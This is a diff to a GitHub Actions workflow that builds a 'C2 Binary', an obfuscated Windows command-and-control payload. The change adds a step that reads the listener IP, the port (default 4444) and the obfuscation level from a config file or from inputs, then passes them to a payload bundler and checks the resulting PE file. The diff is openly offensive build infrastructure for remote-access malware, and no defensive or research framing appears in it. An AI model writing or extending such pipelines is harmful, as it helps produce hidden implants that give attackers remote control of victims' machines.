@@ -35,9 +35,28 @@ jobs:
         python -m pip install --upgrade pip
         pip install pyinstaller
     
+    - name: Read build configuration
+      id: config
+      run: |
+        if (Test-Path build_config.json) {
+          $config = Get-Content build_config.json | ConvertFrom-Json
+          echo "listener_ip=$($config.listener_ip)" >> $env:GITHUB_OUTPUT
+          echo "listener_port=$($config.listener_port)" >> $env:GITHUB_OUTPUT
+          echo "obfuscation_level=$($config.obfuscation_level)" >> $env:GITHUB_OUTPUT
+          Write-Host "Config from build_config.json:"
+          Write-Host "  IP: $($config.listener_ip)"
+          Write-Host "  Port: $($config.listener_port)"
+          Write-Host "  Obfuscation: $($config.obfuscation_level)"
+        } else {
+          echo "listener_ip=${{ github.event.inputs.listener_ip || '192.168.1.1' }}" >> $env:GITHUB_OUTPUT
+          echo "listener_port=${{ github.event.inputs.listener_port || '4444' }}" >> $env:GITHUB_OUTPUT
+          echo "obfuscation_level=${{ github.event.inputs.obfuscation_level || '2' }}" >> $env:GITHUB_OUTPUT
+          Write-Host "Using default/manual inputs"
+        }
+    
     - name: Build C2 Binary
       run: |
-        python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('${{ github.event.inputs.listener_ip || '0.0.0.0' }}', ${{ github.event.inputs.listener_port || 4444 }}, ${{ github.event.inputs.obfuscation_level || 5 }}, 'windows')"
+        python -c "from src.c2_bundler_simple import create_bundled_payload; create_bundled_payload('${{ steps.config.outputs.listener_ip }}', ${{ steps.config.outputs.listener_port }}, ${{ steps.config.outputs.obfuscation_level }}, 'windows')"
     
     - name: Verify PE binary format
       run: |
